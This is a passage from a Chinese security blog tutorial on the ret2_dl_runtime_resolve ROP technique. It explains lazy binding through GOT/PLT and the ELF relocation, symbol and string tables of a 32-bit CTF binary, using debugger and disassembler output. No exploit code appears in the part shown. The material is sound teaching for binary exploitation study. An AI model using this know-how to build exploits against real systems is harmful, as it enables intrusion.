<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-CN">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">
<script>
    (function(){
        if(''){
            if (prompt('请输入文章密码') !== ''){
                alert('密码错误！');
                history.back();
            }
        }
    })();
</script>



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="二进制安全,pwn," />










<meta name="description" content="昔我往矣，杨柳依依；今我来思，雨雪霏霏。">
<meta name="keywords" content="二进制安全,pwn">
<meta property="og:type" content="article">
<meta property="og:title" content="高级rop之ret2_dl_runtime_resolve">
<meta property="og:url" content="http://1234xxh.github.io/2020/09/28/1/index.html">
<meta property="og:site_name" content="sh0wmak3r&#39;s Blog">
<meta property="og:description" content="昔我往矣，杨柳依依；今我来思，雨雪霏霏。">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http://1234xxh.github.io/image/N2LL/16.jpg">
<meta property="og:image" content="http://1234xxh.github.io/image/20200928/image1.png">
<meta property="og:image" content="http://1234xxh.github.io/image/20200928/image2.png">
<meta property="og:image" content="http://1234xxh.github.io/image/20200928/image3.png">
<meta property="og:image" content="http://1234xxh.github.io/image/20200928/image4.png">
<meta property="og:image" content="http://1234xxh.github.io/image/20200928/image5.png">
<meta property="og:image" content="http://1234xxh.github.io/image/20200928/image6.png">
<meta property="og:image" content="http://1234xxh.github.io/image/20200928/image6-1.png">
<meta property="og:image" content="http://1234xxh.github.io/image/20200928/image7.png">
<meta property="og:image" content="http://1234xxh.github.io/image/20200928/image7-1.png">
<meta property="og:image" content="http://1234xxh.github.io/image/20200928/image8.png">
<meta property="og:image" content="http://1234xxh.github.io/image/20200928/image9.png">
<meta property="og:image" content="http://1234xxh.github.io/image/20200928/image10.png">
<meta property="og:image" content="http://1234xxh.github.io/image/20200928/image11.png">
<meta property="og:updated_time" content="2020-10-06T15:50:52.210Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="高级rop之ret2_dl_runtime_resolve">
<meta name="twitter:description" content="昔我往矣，杨柳依依；今我来思，雨雪霏霏。">
<meta name="twitter:image" content="http://1234xxh.github.io/image/N2LL/16.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://1234xxh.github.io/2020/09/28/1/"/>





  <title>高级rop之ret2_dl_runtime_resolve | sh0wmak3r's Blog</title>
  








</head>
<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/src/love.js"></script>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <!-- <div class="headband"></div> -->

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">sh0wmak3r's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">safe | smart contract | binary</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="Searching..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://1234xxh.github.io/2020/09/28/1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="bey0ndm3">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/background.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="sh0wmak3r's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">高级rop之ret2_dl_runtime_resolve</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-28T23:36:29+08:00">
                2020-09-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          
             <span id="/2020/09/28/1/" class="leancloud_visitors" data-flag-title="高级rop之ret2_dl_runtime_resolve">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Visitors&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
            </span>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>昔我往矣，杨柳依依；今我来思，雨雪霏霏。</p>
<p><img src="/image/N2LL/16.jpg" alt="image"><br><a id="more"></a></p>
<h1 id="0x01-GOT-PLT之延迟绑定"><a href="#0x01-GOT-PLT之延迟绑定" class="headerlink" title="0x01 GOT/PLT之延迟绑定"></a>0x01 GOT/PLT之延迟绑定</h1><blockquote>
<p>之前有篇文章讲到了GOT表和PLT表以及延迟绑定，稍微回顾一下。<br>一个函数的动态执行过程如下，以read函数为例子</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">=&gt; 0x8048390 &lt;read@plt&gt;:	jmp    DWORD PTR ds:0x804a004</span><br><span class="line"> | 0x8048396 &lt;read@plt+6&gt;:	push   0x8</span><br><span class="line"> | 0x804839b &lt;read@plt+11&gt;:	jmp    0x8048370</span><br><span class="line"> | 0x80483a0 &lt;__gmon_start__@plt&gt;:	jmp    DWORD PTR ds:0x804a008</span><br><span class="line"> | 0x80483a6 &lt;__gmon_start__@plt+6&gt;:	push   0x10</span><br><span class="line"> |-&gt; 	 	 0x8048396 &lt;read@plt+6&gt;:	push   0x8</span><br><span class="line">     	 	 0x804839b &lt;read@plt+11&gt;:	jmp    0x8048370</span><br><span class="line">      		 0x80483a0 &lt;__gmon_start__@plt&gt;:	jmp    DWORD PTR ds:0x804a008</span><br><span class="line">      		 0x80483a6 &lt;__gmon_start__@plt+6&gt;:	push   0x10</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这是read@plt表，第一步jmp 对应的GOT表的一项，然后0x804a008这个GOT表处，又保存0x8048396，有跳到了&lt;read@plt+6&gt;，这里push 0x8，这个0x08是write函数在.rel.plt中的偏移量，中间插一脚，简单看一下.rel.plt的组成，尤其是偏移量和类型，后面再细说。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwn@pwn-PC:~/Desktop$ readelf -r bed0c68697f74e649f3e1c64ff7838b8 </span><br><span class="line">重定位节 &apos;.rel.plt&apos; 位于偏移量 0x318 含有 5 个条目：</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">0804a000  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0</span><br><span class="line">0804a004  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0</span><br><span class="line">0804a008  00000307 R_386_JUMP_SLOT   00000000   __gmon_start__</span><br><span class="line">0804a00c  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a010  00000507 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0</span><br></pre></td></tr></table></figure>
<blockquote>
<p>然后继续jmp到0x8048370也就是plt[0]，下面两个是<br>push got[1]<br>jmp *got[2]<br>其中：<br>got[1]：address of link_map object也就是本ELF的link_map数据结构描述符地址。<br>got[2]：address of _dl_runtime_resolve function ，也就是_dl_runtime_resolve函数的地址，来得到真正的函数地址，回写到对应的got表位置中。<br>另外，got[0]：address of .dynamic section 也就是本ELF动态段(.dynamic段）的装载地址</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /2wi 0x8048370</span><br><span class="line">   0x8048370:	push   DWORD PTR ds:0x8049ff8</span><br><span class="line">   0x8048376:	jmp    DWORD PTR ds:0x8049ffc</span><br></pre></td></tr></table></figure>
<blockquote>
<p>通过got[2]执行_dl_runtime_resolve函数，可以把read函数的真实地址写在相应的got表中，然后去调用。<br>回顾完了延迟绑定的过程，是不是有些肤浅？目前我们只是知道了这个延迟绑定的大体过程并不知道其中的细节，比如怎么找到真实函数地址，又是怎么将真实函数地址绑定到相应的got表。<br>那么下面我们就对以上两个问题就行探究，来深入了解一下_dl_runtime_resolve这个函数到底是做了什么？</p>
</blockquote>
<h1 id="0x02-GOT-PLT之-dl-runtime-resolve"><a href="#0x02-GOT-PLT之-dl-runtime-resolve" class="headerlink" title="0x02 GOT/PLT之_dl_runtime_resolve"></a>0x02 GOT/PLT之_dl_runtime_resolve</h1><blockquote>
<p>在开始之前我们应该了解一下ELF中我们需要用到的结构：Section Header Table（段表）、.rel.plt（重定向表）、.dynsym（动态符号表）、.dynstr（动态字符串表）。</p>
</blockquote>
<h2 id="Section-Header-Table"><a href="#Section-Header-Table" class="headerlink" title="Section Header Table"></a>Section Header Table</h2><blockquote>
<p>段表是保存段的基本属性结构，也是 ELF 文件中除了文件头以外最重要的结构，描述了 ELF 的各个段的信息，如段名、长度、文件中的偏移、读写权限等。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">	Elf32_Word sh_name;     /* Section name (string tbl index) */</span><br><span class="line">	Elf32_Word sh_type;      /* Section type */</span><br><span class="line"> 	Elf32_Word sh_flags;    /* Section flags */</span><br><span class="line"> 	Elf32_Addr addr;</span><br><span class="line"> 	Elf32_Off sh_offset;</span><br><span class="line"> 	Elf32_Word sh_size;</span><br><span class="line"> 	Elf32_Word sh_link;</span><br><span class="line"> 	Elf32_Word sh_info;</span><br><span class="line"> 	Elf32_Word sh_addralign;</span><br><span class="line"> 	Elf32_Word sh_entsize;</span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>段表是以 Elf32_Shdr 结构体为元素的数组，数组的个数等于元素的个数，每个 Elf32_Shdr 对应一个段， Elf32_Shdr 也成为段描述符。<br>来看一下程序中的Section Header Table</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwn@pwn-PC:~/Desktop$ readelf -S pwn200 </span><br><span class="line">共有 28 个节头，从偏移量 0x1134 开始：</span><br><span class="line">节头：</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481d8 0001d8 000090 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          08048268 000268 000064 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          080482cc 0002cc 000012 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         080482e0 0002e0 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             08048300 000300 000018 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             08048318 000318 000028 08   A  5  12  4</span><br><span class="line">  [11] .init             PROGBITS        08048340 000340 00002e 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        08048370 000370 000060 04  AX  0   0 16</span><br><span class="line">  [13] .text             PROGBITS        080483d0 0003d0 00024c 00  AX  0   0 16</span><br><span class="line">  [14] .fini             PROGBITS        0804861c 00061c 00001a 00  AX  0   0  4</span><br><span class="line">  [15] .rodata           PROGBITS        08048638 000638 000008 00   A  0   0  4</span><br><span class="line">  [16] .eh_frame_hdr     PROGBITS        08048640 000640 00003c 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame         PROGBITS        0804867c 00067c 0000ec 00   A  0   0  4</span><br><span class="line">  [18] .ctors            PROGBITS        08049f14 000f14 000008 00  WA  0   0  4</span><br><span class="line">  [19] .dtors            PROGBITS        08049f1c 000f1c 000008 00  WA  0   0  4</span><br><span class="line">  [20] .jcr              PROGBITS        08049f24 000f24 000004 00  WA  0   0  4</span><br><span class="line">  [21] .dynamic          DYNAMIC         08049f28 000f28 0000c8 08  WA  6   0  4</span><br><span class="line">  [22] .got              PROGBITS        08049ff0 000ff0 000004 04  WA  0   0  4</span><br><span class="line">  [23] .got.plt          PROGBITS        08049ff4 000ff4 000020 04  WA  0   0  4</span><br><span class="line">  [24] .data             PROGBITS        0804a014 001014 000008 00  WA  0   0  4</span><br><span class="line">  [25] .bss              NOBITS          0804a020 00101c 00002c 00  WA  0   0 32</span><br><span class="line">  [26] .comment          PROGBITS        00000000 00101c 00002a 01  MS  0   0  1</span><br><span class="line">  [27] .shstrtab         STRTAB          00000000 001046 0000ec 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  p (processor specific)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>可以清晰的看到段内的每一个name，那么就引出来下几个概念.rel.plt（重定向表）、.dynsym（动态符号表）、.dynstr（动态字符串表）。</p>
</blockquote>
<h2 id="rel-plt（重定向表）"><a href="#rel-plt（重定向表）" class="headerlink" title=".rel.plt（重定向表）"></a>.rel.plt（重定向表）</h2><blockquote>
<p>.rel.plt也就是ELF REL Relocation Table，它是对函数进行修正。还有另一个.rel.dyn ，它包含了动态链接的二进制文件中需要重定位的变量的信息，对数据进行修正。这些信息都是在加载的时候必须完全确定。<br>那么链接器是怎么知道哪些指令是要被调整的呢?这些指令的哪些部分需要被调整?应该怎么调整?这都是通过重定位表来做的。通俗来说它的作用就是在延迟绑定时，让链接器知道谁和谁进行绑定。<br>先来看其结构</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">Elf32_Addr r_offset;</span><br><span class="line">Elf32_Word r_info;</span><br><span class="line"> &#125;Elf32_Rel;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Elf32_Rel中的r_offset是重定向的偏移，保存的某个函数的GOT表，比如elf.got[‘write’]；r_info则是重定向入口的类型和符号，低 8 位表示重定位入口的类型，高 24 位表示重定位入口的符号在符号表中的下标。来看一下程序中的.rel.plt表。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048318 ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:08048318                 Elf32_Rel &lt;804A000h, 107h&gt; ; R_386_JMP_SLOT setbuf</span><br><span class="line">LOAD:08048320                 Elf32_Rel &lt;804A004h, 207h&gt; ; R_386_JMP_SLOT read</span><br><span class="line">LOAD:08048328                 Elf32_Rel &lt;804A008h, 307h&gt; ; R_386_JMP_SLOT __gmon_start__</span><br><span class="line">LOAD:08048330                 Elf32_Rel &lt;804A00Ch, 407h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:08048338                 Elf32_Rel &lt;804A010h, 507h&gt; ; R_386_JMP_SLOT write</span><br><span class="line">LOAD:08048338 LOAD            ends</span><br></pre></td></tr></table></figure>
<blockquote>
<p>以write为例，0x08048338处的Elf32_Rel &lt;804A010h, 507h&gt; 其形式如下</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">Elf32_Addr r_offset = 0x804A010h ;</span><br><span class="line">Elf32_Word r_info = 0x507h;</span><br><span class="line"> &#125;Elf32_Rel;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其中重定向的入口类型就是0x7（R_386_JUMP_SLOT）自行百度；重定向入口的符号就是r_info&gt;&gt;8 =&gt; 0x507&gt;&gt;8 =&gt; 0101 =&gt; 0x5，这就是动态符号表的下标。</p>
</blockquote>
<h2 id="dynsym（动态符号表）"><a href="#dynsym（动态符号表）" class="headerlink" title=".dynsym（动态符号表）"></a>.dynsym（动态符号表）</h2><blockquote>
<p>其中只保存了动态链接相关的符号，还有一个表.symtab表，这个往往保存了所有的符号，包含.dynsym中的符号。<br>其结构如下</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line"> 	Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移</span><br><span class="line">  	Elf32_Addr    st_value;</span><br><span class="line">  	Elf32_Word    st_size;</span><br><span class="line"> 	unsigned char st_info; //对于导入函数符号而言，它是0x12</span><br><span class="line"> 	unsigned char st_other;</span><br><span class="line">  	Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; //对于导入函数符号而言，其他字段都是0</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里有两点需要注意：<br>一、len(Elf32_Sym) == 0x10，因此它的下表就是[num/0x10]；<br>二、st_name这个参数是符号名，保存的是相对.dynstr起始的偏移量，也就是st_name表示在.dynstr的偏移地址，从而找到.dynstr中某个字符串。<br>继续来看一下程序中的.dynsym表。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080481D8 ; ELF Symbol Table</span><br><span class="line">LOAD:080481D8                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481E8                 Elf32_Sym &lt;offset aSetbuf - offset byte_8048268, 0, 0, 12h, 0, 0&gt; ; &quot;setbuf&quot;</span><br><span class="line">LOAD:080481F8                 Elf32_Sym &lt;offset aRead - offset byte_8048268, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;</span><br><span class="line">LOAD:08048208                 Elf32_Sym &lt;offset aGmonStart - offset byte_8048268, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:08048218                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_8048268, 0, 0, 12h, 0, \ ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:08048218                            0&gt;</span><br><span class="line">LOAD:08048228                 Elf32_Sym &lt;offset aWrite - offset byte_8048268, 0, 0, 12h, 0, 0&gt; ; &quot;write&quot;</span><br><span class="line">LOAD:08048238                 Elf32_Sym &lt;offset aStdout - offset byte_8048268, offset stdout, 4, \ ; &quot;stdout&quot;</span><br><span class="line">LOAD:08048238                            11h, 0, 19h&gt;</span><br><span class="line">LOAD:08048248                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_8048268, \ ; &quot;_IO_stdin_used&quot;</span><br><span class="line">LOAD:08048248                            offset _IO_stdin_used, 4, 11h, 0, 0Fh&gt;</span><br><span class="line">LOAD:08048258                 Elf32_Sym &lt;offset aStdin - offset byte_8048268, offset stdin, 4, 11h, \ ; &quot;stdin&quot;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>依然以write函数为例，其Elf32_Sym为：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line"> 	Elf32_Word    st_name = offset aWrite - offset byte_8048268;</span><br><span class="line">  	Elf32_Addr    st_value = 0;</span><br><span class="line">  	Elf32_Word    st_size = 0;</span><br><span class="line"> 	unsigned char st_info = 0x12; </span><br><span class="line"> 	unsigned char st_other = 0;</span><br><span class="line">  	Elf32_Section st_shndx = 0;</span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure>
<h2 id="dynstr（动态字符串表）"><a href="#dynstr（动态字符串表）" class="headerlink" title=".dynstr（动态字符串表）"></a>.dynstr（动态字符串表）</h2><blockquote>
<p>用来存储.dynsym段符号对应的符号名，这个就是最终目的地。来看一下程序中的.dynstr表。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048268 ; ELF String Table</span><br><span class="line">LOAD:08048268 byte_8048268    db 0                    ; DATA XREF: LOAD:080481E8↑o</span><br><span class="line">LOAD:08048268                                         ; LOAD:080481F8↑o ...</span><br><span class="line">LOAD:08048269 aGmonStart      db &apos;__gmon_start__&apos;,0   ; DATA XREF: LOAD:08048208↑o</span><br><span class="line">LOAD:08048278 aLibcSo6        db &apos;libc.so.6&apos;,0</span><br><span class="line">LOAD:08048282 aIoStdinUsed    db &apos;_IO_stdin_used&apos;,0   ; DATA XREF: LOAD:08048248↑o</span><br><span class="line">LOAD:08048291 aStdin          db &apos;stdin&apos;,0            ; DATA XREF: LOAD:08048258↑o</span><br><span class="line">LOAD:08048297 aRead           db &apos;read&apos;,0             ; DATA XREF: LOAD:080481F8↑o</span><br><span class="line">LOAD:0804829C aStdout         db &apos;stdout&apos;,0           ; DATA XREF: LOAD:08048238↑o</span><br><span class="line">LOAD:080482A3 aSetbuf         db &apos;setbuf&apos;,0           ; DATA XREF: LOAD:080481E8↑o</span><br><span class="line">LOAD:080482AA aLibcStartMain  db &apos;__libc_start_main&apos;,0</span><br><span class="line">LOAD:080482AA                                         ; DATA XREF: LOAD:08048218↑o</span><br><span class="line">LOAD:080482BC aWrite          db &apos;write&apos;,0            ; DATA XREF: LOAD:08048228↑o</span><br><span class="line">LOAD:080482C2 aGlibc20        db &apos;GLIBC_2.0&apos;,0</span><br><span class="line">LOAD:080482CC                 dd 20000h, 2, 20002h, 10002h, 2, 10001h, 2 dup(10h), 0</span><br><span class="line">LOAD:080482F0                 dd 0D696910h, 20000h, 5Ah, 0</span><br><span class="line">LOAD:08048300 ; ELF REL Relocation Table</span><br></pre></td></tr></table></figure>
<blockquote>
<p>以wrie函数为例子，偏移st_name即可找到LOAD:080482BC aWrite          db ‘write’,0            ; DATA XREF: LOAD:08048228↑o。</p>
</blockquote>
<h2 id="寻找时的过程"><a href="#寻找时的过程" class="headerlink" title="寻找时的过程"></a>寻找时的过程</h2><blockquote>
<p>还有另外提一个概念，它是.dynamic（动态节），它里面ELF的依赖于哪些动态库、动态符号节信息、动态字符串节信息的信息，其结构如下：</p>
</blockquote>
